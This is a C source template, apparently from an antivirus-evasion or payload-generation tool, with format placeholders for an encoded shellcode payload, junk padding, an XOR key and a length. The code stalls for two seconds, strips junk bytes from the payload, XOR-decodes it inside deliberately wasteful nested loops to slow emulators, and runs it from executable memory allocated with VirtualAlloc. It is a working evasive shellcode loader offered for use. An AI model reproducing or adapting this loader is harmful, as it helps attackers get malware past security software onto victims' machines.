#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <time.h>

int main(){
char junkA []= %s;
unsigned char payload[] = %s;
char junkB []= %s;
unsigned char key = %s;
unsigned int PAYLOAD_LENGTH = %s;
int i;
unsigned char* exec = (unsigned char*)VirtualAlloc(NULL, PAYLOAD_LENGTH/2 ,0x1000,0x40);
unsigned char* unpack = (unsigned char*)VirtualAlloc(NULL, PAYLOAD_LENGTH/2, 0x1000,0x40);
int z, y;
int devide;
int x = 0;
time_t start_time, cur_time;

time(&start_time);
do
{
time(&cur_time);
}
while((cur_time - start_time) < 2);

for(i=0; i<PAYLOAD_LENGTH; i++)
{
devide = %s
if(devide == 0)
{
unpack[x]=payload[i];
x++;
}
}

for(i=0; i<PAYLOAD_LENGTH/2; i++)
{
    for(z=0;z<5000;z++)
    {
	for(y=0;y<500;y++)
	{
    		exec[i]=unpack[i]^key;
    	}
    }
}

((void (*)())exec)();

return 0;
}
